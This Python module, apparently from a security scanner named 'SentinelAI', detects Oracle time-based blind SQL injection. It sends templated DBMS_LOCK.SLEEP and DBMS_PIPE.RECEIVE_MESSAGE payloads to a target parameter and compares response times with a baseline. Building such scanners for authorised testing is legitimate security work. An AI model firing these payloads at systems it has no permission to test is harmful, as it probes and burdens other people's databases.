# app/modules/scanner/blind_time.py
"""
Oracle Time-Based Blind SQL Injection Engine for SentinelAI.
Phase 12: Time-Based Blind SQL Injection Detection
"""

import logging
import time
import statistics
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any, Tuple
import requests

from .union_sqli import UnionSQLi
from .html_parser import HTMLParser
from .regex_utils import RegexUtils

# ============================================================
# Data Classes
# ============================================================


@dataclass
class TimeBlindResult:
    """
    Time-based blind SQL injection detection result.
    """

    success: bool = False
    is_vulnerable: bool = False
    baseline_response_time: float = 0.0
    delayed_response_time: float = 0.0
    delay_detected: bool = False
    delay_seconds: float = 0.0
    expected_delay: float = 0.0
    working_payloads: List[str] = field(default_factory=list)
    confidence: int = 0
    evidence: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    execution_time: float = 0.0
    best_payload: Optional[str] = None
    measurements: List[float] = field(default_factory=list)
    baseline_measurements: List[float] = field(default_factory=list)
    delayed_measurements: List[float] = field(default_factory=list)
    network_jitter: float = 0.0
    false_positive_rate: float = 0.0

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def add_evidence(self, evidence: str):
        """Add evidence to the result."""
        if evidence and evidence not in self.evidence:
            self.evidence.append(evidence)

    def add_working_payload(self, payload: str):
        """Add a working payload to the result."""
        if payload and payload not in self.working_payloads:
            self.working_payloads.append(payload)

    def get_summary(self) -> str:
        """Get a summary of the detection result."""
        if not self.success:
            return "Time blind detection failed"

        if not self.is_vulnerable:
            return "Time-based blind SQL injection not detected"

        parts = []
        parts.append(f"Vulnerable: YES")
        parts.append(f"Delay: {self.delay_seconds:.2f}s")
        parts.append(f"Confidence: {self.confidence}%")
        if self.best_payload:
            parts.append(f"Payload: {self.best_payload[:30]}...")
        if self.evidence:
            parts.append(f"Evidence: {len(self.evidence)} items")

        return f"Time Blind: {', '.join(parts)}"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "is_vulnerable": self.is_vulnerable,
            "baseline_response_time": self.baseline_response_time,
            "delayed_response_time": self.delayed_response_time,
            "delay_detected": self.delay_detected,
            "delay_seconds": self.delay_seconds,
            "expected_delay": self.expected_delay,
            "working_payloads": self.working_payloads,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "errors": self.errors,
            "execution_time": self.execution_time,
            "best_payload": self.best_payload,
            "network_jitter": self.network_jitter,
            "false_positive_rate": self.false_positive_rate,
            "summary": self.get_summary(),
        }


# ============================================================
# Main Time Blind Engine Class
# ============================================================


class OracleTimeBlindEngine:
    """
    Oracle Time-Based Blind SQL Injection Engine.
    Phase 12: Detects time-based blind SQL injection.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Default delays to test (in seconds)
    DEFAULT_DELAYS = [2, 3, 5, 10]

    # Minimum delay to consider significant (in seconds)
    MIN_SIGNIFICANT_DELAY = 0.5

    # Number of measurements per test
    MEASUREMENTS_PER_TEST = 3

    # Baseline measurements
    BASELINE_MEASUREMENTS = 5

    # Confidence thresholds
    CONFIDENCE_HIGH = 90
    CONFIDENCE_MEDIUM = 70
    CONFIDENCE_LOW = 50

    # Payload templates
    SLEEP_PAYLOADS = [
        "AND DBMS_LOCK.SLEEP({delay})--",
        "AND DBMS_PIPE.RECEIVE_MESSAGE('A',{delay})--",
        "AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END FROM dual)--",
        "AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END FROM dual)",
        "' AND DBMS_LOCK.SLEEP({delay})--",
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',{delay})--",
        "' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END FROM dual)--",
    ]

    # Conditional sleep payloads
    CONDITIONAL_PAYLOADS = [
        "AND CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END--",
        "AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('A',{delay}) ELSE 1 END--",
        "AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END FROM dual)--",
        "AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END FROM dual)--",
    ]

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: Optional[logging.Logger] = None,
    ):
        """
        Initialize Oracle Time Blind Engine.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()

        # State
        self.baseline_response = None
        self.time_result = None

        self.logger.info("[TimeBlind] Module initialized for time blind detection")
        self.logger.info(f"[TimeBlind] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("TimeBlind")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> Optional[requests.Response]:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[TimeBlind] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[TimeBlind] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning("[TimeBlind] Failed to get baseline response")

        return self.baseline_response

    def _send_payload_with_timing(
        self, injection_point: str, payload: str
    ) -> Tuple[Optional[requests.Response], float]:
        """
        Send payload and measure response time.

        Args:
            injection_point: Parameter to inject into
            payload: SQL injection payload

        Returns:
            Tuple[Optional[Response], float]: Response and time in seconds
        """
        start_time = time.time()

        baseline = self._get_baseline(injection_point)
        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        elapsed = time.time() - start_time

        if not result["success"] or result.get("response") is None:
            return None, elapsed

        return result["response"], elapsed

    def _measure_response_time(
        self,
        injection_point: str,
        payload: Optional[str] = None,
        num_measurements: int = 3,
    ) -> Tuple[float, List[float]]:
        """
        Measure response time for a payload.

        Args:
            injection_point: Parameter to inject into
            payload: SQL injection payload (None for baseline)
            num_measurements: Number of measurements

        Returns:
            Tuple[float, List[float]]: Average time and measurements
        """
        measurements = []

        for i in range(num_measurements):
            if payload:
                _, elapsed = self._send_payload_with_timing(injection_point, payload)
            else:
                # Baseline measurement
                baseline = self._get_baseline(injection_point)
                start_time = time.time()
                self.union_sqli.get_baseline(injection_point)
                elapsed = time.time() - start_time

            if elapsed > 0:
                measurements.append(elapsed)
                self.logger.debug(f"[TimeBlind] Measurement {i+1}: {elapsed:.3f}s")
            else:
                measurements.append(0.1)  # Minimum baseline

        if not measurements:
            measurements = [0.1]

        avg_time = (
            statistics.mean(measurements) if len(measurements) > 1 else measurements[0]
        )
        return avg_time, measurements

    def _calculate_confidence(
        self, delay_seconds: float, expected_delay: float, baseline_jitter: float
    ) -> int:
        """
        Calculate confidence based on delay and jitter.

        Args:
            delay_seconds: Measured delay
            expected_delay: Expected delay
            baseline_jitter: Baseline jitter

        Returns:
            int: Confidence score (0-100)
        """
        if delay_seconds <= 0:
            return 0

        # Calculate delay ratio
        delay_ratio = delay_seconds / expected_delay if expected_delay > 0 else 0

        # Start with base confidence
        confidence = 50

        # Adjust based on delay ratio
        if delay_ratio >= 0.8:
            confidence += 40
        elif delay_ratio >= 0.5:
            confidence += 25
        elif delay_ratio >= 0.3:
            confidence += 10

        # Adjust based on jitter
        if baseline_jitter < 0.1:
            confidence += 10
        elif baseline_jitter < 0.5:
            confidence += 5

        # Ensure minimum delay is significant
        if delay_seconds < self.MIN_SIGNIFICANT_DELAY:
            confidence = min(confidence, 50)

        return min(confidence, 100)

    # ============================================================
    # Public Detection Methods
    # ============================================================

    def detect_time_blind(
        self,
        injection_point: str,
        delays: List[int] = None,
        num_measurements: int = MEASUREMENTS_PER_TEST,
    ) -> TimeBlindResult:
        """
        Detect time-based blind SQL injection.

        Args:
            injection_point: Parameter to inject into
            delays: List of delays to test (seconds)
            num_measurements: Number of measurements per test

        Returns:
            TimeBlindResult: Detection result
        """
        self.logger.info(
            "[TimeBlind] =================================================="
        )
        self.logger.info("[TimeBlind] PHASE 12: Time Blind SQL Injection Detection")
        self.logger.info(
            "[TimeBlind] =================================================="
        )

        result = TimeBlindResult()
        total_start = time.time()

        if delays is None:
            delays = self.DEFAULT_DELAYS

        try:
            # Step 1: Measure baseline
            self.logger.info("[TimeBlind] Step 1: Measuring baseline response time...")
            baseline_avg, baseline_measurements = self._measure_response_time(
                injection_point, None, self.BASELINE_MEASUREMENTS
            )

            result.baseline_response_time = baseline_avg
            result.baseline_measurements = baseline_measurements

            # Calculate baseline jitter
            if len(baseline_measurements) > 1:
                result.network_jitter = statistics.stdev(baseline_measurements)
            else:
                result.network_jitter = 0.1

            self.logger.info(
                f"[TimeBlind] Baseline: {baseline_avg:.3f}s (jitter: {result.network_jitter:.3f}s)"
            )

            # Step 2: Test different delay payloads
            self.logger.info("[TimeBlind] Step 2: Testing delay payloads...")

            best_delay = 0
            best_payload = None
            best_confidence = 0
            best_measurements = []

            for delay in delays:
                self.logger.info(f"[TimeBlind] Testing {delay}s delay...")

                # Generate payloads for this delay
                payloads = self.build_sleep_payloads(delay)
                payloads.extend(self.build_case_payloads(delay))

                for payload in payloads[:5]:  # Limit payloads per delay
                    self.logger.debug(f"[TimeBlind] Testing payload: {payload[:50]}...")

                    avg_time, measurements = self._measure_response_time(
                        injection_point, payload, num_measurements
                    )

                    result.measurements.extend(measurements)
                    result.delayed_measurements.extend(measurements)

                    # Calculate delay
                    measured_delay = avg_time - baseline_avg

                    self.logger.debug(
                        f"[TimeBlind] Avg: {avg_time:.3f}s, Delay: {measured_delay:.3f}s"
                    )

                    # Check if delay is significant
                    if measured_delay >= self.MIN_SIGNIFICANT_DELAY:
                        confidence = self._calculate_confidence(
                            measured_delay, delay, result.network_jitter
                        )

                        if confidence > best_confidence:
                            best_confidence = confidence
                            best_delay = measured_delay
                            best_payload = payload
                            best_measurements = measurements
                            result.add_working_payload(payload)

                            self.logger.info(
                                f"[TimeBlind] Found significant delay: {measured_delay:.3f}s (confidence: {confidence}%)"
                            )

                # If we found a good delay, we can stop testing larger delays
                if best_confidence >= self.CONFIDENCE_HIGH:
                    self.logger.info(
                        "[TimeBlind] High confidence detected, stopping tests"
                    )
                    break

            # Step 3: Verify with multiple measurements
            if best_payload and best_confidence >= self.CONFIDENCE_MEDIUM:
                self.logger.info("[TimeBlind] Step 3: Verifying delay...")

                # Verify with additional measurements
                verify_avg, verify_measurements = self._measure_response_time(
                    injection_point, best_payload, 5
                )

                verify_delay = verify_avg - baseline_avg

                self.logger.info(f"[TimeBlind] Verification delay: {verify_delay:.3f}s")

                if verify_delay >= self.MIN_SIGNIFICANT_DELAY * 0.8:
                    best_delay = verify_delay
                    result.delayed_measurements.extend(verify_measurements)
                    result.add_evidence(f"Delay confirmed: {verify_delay:.3f}s")
                    best_confidence = min(best_confidence + 5, 100)
                else:
                    self.logger.warning(
                        "[TimeBlind] Verification failed, delay not consistent"
                    )
                    best_confidence = max(best_confidence - 20, 0)
                    result.add_evidence("Verification failed")

            # Finalize result
            if best_payload and best_confidence >= self.CONFIDENCE_LOW:
                result.is_vulnerable = True
                result.delay_detected = True
                result.delay_seconds = best_delay
                result.delayed_response_time = best_delay + baseline_avg
                result.best_payload = best_payload
                result.confidence = best_confidence
                result.expected_delay = max(delays) if delays else 5
                result.add_evidence(
                    f"Time-based injection detected with {best_delay:.3f}s delay"
                )
            else:
                result.is_vulnerable = False
                result.add_evidence("No significant time delay detected")

            result.success = True

        except Exception as e:
            error_msg = f"Time blind detection failed: {str(e)}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - total_start

        self.logger.info(
            "[TimeBlind] =================================================="
        )
        self.logger.info("[TimeBlind] TIME BLIND DETECTION COMPLETE")
        self.logger.info(f"[TimeBlind] {result.get_summary()}")
        self.logger.info(f"[TimeBlind] Time: {result.execution_time:.2f}s")
        self.logger.info(
            "[TimeBlind] =================================================="
        )

        self.time_result = result
        return result

    def measure_baseline(
        self, injection_point: str, num_measurements: int = 5
    ) -> float:
        """
        Measure baseline response time.

        Args:
            injection_point: Parameter to inject into
            num_measurements: Number of measurements

        Returns:
            float: Average baseline time
        """
        self.logger.info("[TimeBlind] Measuring baseline...")
        avg, _ = self._measure_response_time(injection_point, None, num_measurements)
        return avg

    def measure_payload(
        self, injection_point: str, payload: str, num_measurements: int = 3
    ) -> float:
        """
        Measure response time for a payload.

        Args:
            injection_point: Parameter to inject into
            payload: SQL injection payload
            num_measurements: Number of measurements

        Returns:
            float: Average response time
        """
        self.logger.info("[TimeBlind] Measuring payload...")
        avg, _ = self._measure_response_time(injection_point, payload, num_measurements)
        return avg

    def calculate_delay(
        self, injection_point: str, payload: str, baseline_time: Optional[float] = None
    ) -> float:
        """
        Calculate delay between baseline and payload.

        Args:
            injection_point: Parameter to inject into
            payload: SQL injection payload
            baseline_time: Baseline time (optional)

        Returns:
            float: Delay in seconds
        """
        if baseline_time is None:
            baseline_time = self.measure_baseline(injection_point)

        payload_time = self.measure_payload(injection_point, payload)
        return payload_time - baseline_time

    def verify_delay(
        self,
        injection_point: str,
        payload: str,
        expected_delay: float,
        num_measurements: int = 5,
    ) -> bool:
        """
        Verify a delay is consistent.

        Args:
            injection_point: Parameter to inject into
            payload: SQL injection payload
            expected_delay: Expected delay in seconds
            num_measurements: Number of measurements

        Returns:
            bool: True if delay is verified
        """
        self.logger.info(f"[TimeBlind] Verifying {expected_delay}s delay...")

        baseline = self.measure_baseline(injection_point, 3)
        avg_time, measurements = self._measure_response_time(
            injection_point, payload, num_measurements
        )

        actual_delay = avg_time - baseline

        # Check if actual delay is close to expected
        delay_ratio = actual_delay / expected_delay if expected_delay > 0 else 0

        verified = delay_ratio >= 0.5 and actual_delay >= self.MIN_SIGNIFICANT_DELAY

        self.logger.info(
            f"[TimeBlind] Verification: {'PASS' if verified else 'FAIL'} (delay: {actual_delay:.3f}s)"
        )
        return verified

    def build_sleep_payloads(self, delay: int) -> List[str]:
        """
        Build sleep-based payloads.

        Args:
            delay: Delay in seconds

        Returns:
            List[str]: List of payloads
        """
        payloads = []
        for template in self.SLEEP_PAYLOADS:
            payload = template.format(delay=delay)
            payloads.append(payload)
        return payloads

    def build_pipe_payloads(self, delay: int) -> List[str]:
        """
        Build DBMS_PIPE payloads.

        Args:
            delay: Delay in seconds

        Returns:
            List[str]: List of payloads
        """
        return [
            f"AND DBMS_PIPE.RECEIVE_MESSAGE('A',{delay})--",
            f"' AND DBMS_PIPE.RECEIVE_MESSAGE('A',{delay})--",
            f"AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('A',{delay}) ELSE 1 END--",
        ]

    def build_case_payloads(self, delay: int) -> List[str]:
        """
        Build CASE-based payloads.

        Args:
            delay: Delay in seconds

        Returns:
            List[str]: List of payloads
        """
        payloads = []
        for template in self.CONDITIONAL_PAYLOADS:
            payload = template.format(delay=delay)
            payloads.append(payload)
        return payloads

    def find_best_payload(
        self, injection_point: str, delays: List[int] = None
    ) -> Tuple[Optional[str], float, int]:
        """
        Find the best payload.

        Args:
            injection_point: Parameter to inject into
            delays: List of delays to test

        Returns:
            Tuple[Optional[str], float, int]: Best payload, delay, confidence
        """
        if delays is None:
            delays = self.DEFAULT_DELAYS

        result = self.detect_time_blind(injection_point, delays)
        return result.best_payload, result.delay_seconds, result.confidence

    def generate_payload(self, delay: int, payload_type: str = "sleep") -> str:
        """
        Generate a time-based payload.

        Args:
            delay: Delay in seconds
            payload_type: Type of payload (sleep, pipe, case)

        Returns:
            str: Generated payload
        """
        if payload_type == "sleep":
            return f"AND DBMS_LOCK.SLEEP({delay})--"
        elif payload_type == "pipe":
            return f"AND DBMS_PIPE.RECEIVE_MESSAGE('A',{delay})--"
        elif payload_type == "case":
            return f"AND CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END--"
        else:
            return f"AND DBMS_LOCK.SLEEP({delay})--"

    def compare_timings(
        self, injection_point: str, payload: str, baseline_time: float
    ) -> Dict[str, Any]:
        """
        Compare timing between baseline and payload.

        Args:
            injection_point: Parameter to inject into
            payload: SQL injection payload
            baseline_time: Baseline time

        Returns:
            Dict: Comparison results
        """
        payload_time = self.measure_payload(injection_point, payload)
        delay = payload_time - baseline_time

        return {
            "baseline_time": baseline_time,
            "payload_time": payload_time,
            "delay": delay,
            "is_significant": delay >= self.MIN_SIGNIFICANT_DELAY,
        }

    def calculate_confidence(
        self, delay_seconds: float, expected_delay: float, baseline_jitter: float
    ) -> int:
        """
        Calculate confidence based on delay and jitter.

        Args:
            delay_seconds: Measured delay
            expected_delay: Expected delay
            baseline_jitter: Baseline jitter

        Returns:
            int: Confidence score (0-100)
        """
        return self._calculate_confidence(
            delay_seconds, expected_delay, baseline_jitter
        )

    def is_time_based_vulnerable(self, injection_point: str) -> bool:
        """
        Quick check if parameter is vulnerable to time-based injection.

        Args:
            injection_point: Parameter to test

        Returns:
            bool: True if vulnerable
        """
        result = self.detect_time_blind(injection_point, delays=[5])
        return result.is_vulnerable

    def get_best_time_payload(self, injection_point: str) -> Optional[str]:
        """
        Get the best time-based payload.

        Args:
            injection_point: Parameter to test

        Returns:
            Optional[str]: Best payload or None
        """
        if self.time_result and self.time_result.best_payload:
            return self.time_result.best_payload

        result = self.detect_time_blind(injection_point, delays=[5])
        if result.success and result.is_vulnerable:
            return result.best_payload
        return None
